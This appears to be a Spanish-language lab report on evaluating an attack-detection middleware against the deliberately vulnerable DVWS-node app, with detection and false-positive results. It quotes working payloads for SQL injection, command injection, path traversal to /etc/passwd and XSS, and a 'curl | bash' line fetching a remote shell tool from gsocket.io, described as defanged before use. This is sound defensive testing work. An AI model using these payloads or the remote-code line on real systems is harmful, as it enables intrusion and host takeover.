# dvws-node (Damn Vulnerable Web Service) — resultados

**Repo:** [snoopysecurity/dvws-node](https://github.com/snoopysecurity/dvws-node) · **Rama de la
integración:** `feat/logsguardian-integration` en el clon local
(`/Users/xtsebas/Universidad/dvws-node`), sin commitear. **Fecha:** 2026-09-30.

## La app

Node.js/Express con MongoDB (Mongoose) + MySQL (Sequelize), más SOAP, XML-RPC y GraphQL. Levantada de
forma nativa (`npm start`, puerto cambiado de 80→3000 vía `.env` para evitar `sudo`), con MongoDB
(`mongo:4.0.4`) y MySQL (`mysql:8`) en contenedores sueltos, base sembrada con
`node scripts/seed-database.js`.

## Cobertura de las 4 categorías — explotación confirmada en 3, reflexión sin ejecución confirmada en XSS

**Nota de alcance:** "confirmado" abajo significa explotación real verificada manualmente (hash
extraído, archivo leído, comando ejecutado), excepto XSS, donde solo se confirmó reflexión sin
sanitizar — ver la salvedad inmediatamente debajo de la tabla. No tratar la presencia de XSS en esta
tabla como evidencia de ejecución en navegador.

| Categoría | Endpoint | Auth |
|---|---|---|
| SQL Injection | `GET /api/v2/passphrase/:username` (Sequelize, interpolación directa) | No |
| XSS | `POST /api/v2/users` (username reflejado sin escapar en la respuesta 409) | No |
| Path Traversal/LFI | `POST /api/download` (`filename` → `path.resolve()` sin sanitizar) | Sí (JWT) |
| Command Injection | `GET /api/v2/sysinfo/:command` (→ `child_process.exec()`) | Sí (JWT) |

## Confirmación "antes" (sin logsguardian) — observación manual, sin captura adjunta

**Nota de respaldo:** lo que sigue es una observación manual registrada en este documento al momento
de la integración (2026-09-30); no hay un log de response body ni una captura de pantalla adjunta en
`evidence/dvws-node/` que permita re-verificarlo de forma independiente desde el PR. Los JSON del
corpus (`results-before.json`/`results-after.json`) confirman códigos de estado HTTP y clases
predichas, no el contenido de la respuesta — un 200/500 no prueba por sí solo que se extrajo un hash o
se ejecutó un comando. Tratar lo siguiente como observación preliminar, no como evidencia cerrada:

- **SQLi:** `GET /api/v2/passphrase/' OR '1'='1` → volcó el hash de passphrase del admin.
- **Command Injection:** `uname;id` → `uid=501(xtsebas) gid=20(staff)...` (ejecución real en el host).
- **Path Traversal:** `filename=../../../../../../../../etc/passwd` → devolvió `/etc/passwd` completo.
- **XSS:** registro con username `<script>alert(1)</script>` → reflejado crudo, sin escapar, en el
  cuerpo de la respuesta 409. **Confirma reflexión sin sanitizar, no ejecución confirmada en
  navegador** — la respuesta se sirve con `Content-Type: text/plain`, que la mayoría de navegadores
  no interpreta como HTML/JS ejecutable. Para elevar esto a XSS reflejado explotable haría falta un
  sink que lo sirva como `text/html` (o un endpoint que lo re-renderice sin escapar en otra vista);
  no se verificó ninguno de los dos en esta integración. Lo que se mide más abajo es la capacidad de
  logsguardian de **detectar el payload en el request**, no la explotabilidad end-to-end.

## Resultados del corpus (40 payloads/clase, 200 total)

Muestreo estratificado del fixture de 500 líneas, evitando deliberadamente las primeras N líneas de
cada bloque: ~26-30% de los payloads de sqli/cmdi contienen `SLEEP(15)` y similares, que sin protección
duermen 15s reales contra MySQL/`exec()` — se necesitaba una muestra representativa sin que la corrida
se disparara en tiempo.

| Clase | Antes (sin logsguardian) | Después (`mode: 'block'`) |
|---|---|---|
| sqli | 0/40 (0%) | 40/40 (100%) |
| xss | 0/40 (0%) | 37/40 (92.5%) |
| path_traversal | 5/40 (12.5% — 403 del propio SO/fs, no de logsguardian, confirmado por ausencia en `logsguardian-events.db`) | 40/40 (100%) |
| cmdi | 0/40 (0%) | 40/40 (100%) |
| **benign** | N/A (middleware apagado) | **37/40 (92.5%) — falsos positivos** |

Recall excelente — el mejor de las 3 apps del estudio. Verificado vía `npx logsguardian attacks list`
(sqli 132, path_traversal 40, xss 23, cmdi 16 eventos acumulados). Nota metodológica: para sqli/cmdi el
payload va en el segmento de la URL, así que cada request produce un `path` literal distinto y
`endpoints profile` no agrega esas filas — quirk esperado del CLI dado ese estilo de ruta, no un bug.

## Falsos positivos — el peor de las 3 apps, y corrige una hipótesis previa

**Recall alto en ataques (92.5-100%) junto con falsos positivos igualmente altos (92.5% sobre el
corpus de 40) no es evidencia fuerte de que el sistema discrimine bien entre tráfico benigno y
malicioso** — el patrón es compatible con un problema de calibración o sesgo del modelo frente a esta
forma de tráfico, lo que vuelve poco informativo leer el recall de forma aislada. No se corrió un
barrido de `RF_THRESHOLD` en esta integración, así que no se puede aislar cuánto del bloqueo viene del
valor del umbral específicamente frente a las probabilidades que el modelo ya produce para este tipo
de request — los dos números (recall y FP) deben leerse juntos, no por separado, pero la causa no está
aislada todavía.

Como muestra cualitativa adicional, pequeña y no representativa por sí sola (n=5, solo para
ilustrar *qué tipo* de request benigna se bloquea — la cifra robusta es el 92.5% sobre n=40 arriba),
de 5 peticiones benignas típicas (User-Agent real de Chrome), **3/5 (60%) bloqueadas**, todas
mal-clasificadas como `path_traversal`:

- `GET /api/v1/info` (GET simple, sin query/body) → **BLOQUEADO**
- `GET /api/v2/users/profile` (autenticado, listado normal) → **BLOQUEADO**
- `GET /api/v2/passphrase/admin` (uso legítimo del endpoint, sin inyección) → **BLOQUEADO**
- `GET /` y login normal → OK

**Hallazgo más importante de esta app: se probó explícitamente si un User-Agent de navegador real
mejoraba la tasa de falsos positivos (la hipótesis del bug original de `ua_length`) — y la empeoró**,
de 75% (`results-after-nodeua.json`, User-Agent por defecto de Node, `node`, 30/40 benignos bloqueados)
a 92.5% (`results-after.json`, User-Agent real de navegador, 37/40) sobre el corpus benigno completo
(40 muestras), pese a que `ua_length` es la feature #1 en importancia según `attacks inspect sqli`.
Esto refuta la hipótesis estrecha de que sustituir un User-Agent corto por uno de navegador resolvería
los falsos positivos — en esta app ocurre lo contrario. No establece, por sí solo, cuál es la causa
exacta compartida entre apps ni que todo User-Agent largo produzca el mismo efecto: es compatible con
el sesgo de representación de UA documentado en `docs/limitations.md` (ver la nota de generalización
más abajo), pero esta integración no aisló esa causa de forma independiente. Lo que sí queda
establecido aquí: el problema es más amplio e inestable que un solo header — pequeños cambios de
headers mueven el veredicto en cualquier dirección.

Ejemplo concreto: **contraseñas fuertes realistas** (`Attacker123!`, `MyP@ssw0rd`, `Summer2026`,
`Tr0ub4dor`, incluso `Password`/`HELLO` en mayúsculas) bloquean logins legítimos de usuarios ya
registrados, clasificados como `sqli` — reproducible en cualquier endpoint, no solo login.

## Problemas de integración

- `dbPath` explícito y absoluto, sincronizado entre middleware y CLI desde el inicio — sin el problema
  ya conocido de desalineación.
- Orden de montaje sin sorpresas: body parsers → `fileUpload` → logsguardian → rutas.
- **Precaución de seguridad operacional real:** varios payloads del corpus (RCE reales, del estilo
  `curl -fsSL https://gsocket.io/y | bash`, con IPs/dominios externos) habrían ejecutado código remoto
  real contra el host, porque esta app corre nativa (no en contenedor) y el endpoint cmdi hace
  `exec()` real. Se neutralizaron reemplazando URLs/IPs externas por `127.0.0.1:1` antes de enviarlos
  (`defangCmdiPayload()`), documentado explícitamente en el script.

**Evidencia cruda copiada a este repo:** [`evidence/dvws-node/`](evidence/dvws-node/)
(`run-attacks.js`, `benign-fp-check.js`, `results-before.json`, `results-after.json`,
`results-after-nodeua.json`).

## Archivos de la integración (en el clon, rama `feat/logsguardian-integration`, sin commitear)

- Modificados: `src/server.js`, `.env` (puerto), `package.json`/`package-lock.json`
- Nuevos: `logsguardian.config.js`, `.npmrc`, `attack-sim/run-attacks.js`,
  `attack-sim/benign-fp-check.js`, `attack-sim/results-{before,after,after-nodeua}.json`,
  `logsguardian-events.db`, `.npm-cache/` (artefacto local de instalación, no relevante para revisión)

## Cómo reproducir

```bash
cd /Users/xtsebas/Universidad/dvws-node
docker start dvws-mongo dvws-mysql   # o recrearlos si no existen
npm start &                          # puerto 3000
node attack-sim/run-attacks.js       # ataques reales, con logsguardian activo
node attack-sim/benign-fp-check.js   # chequeo de falsos positivos (incluye la variante con UA real)
```
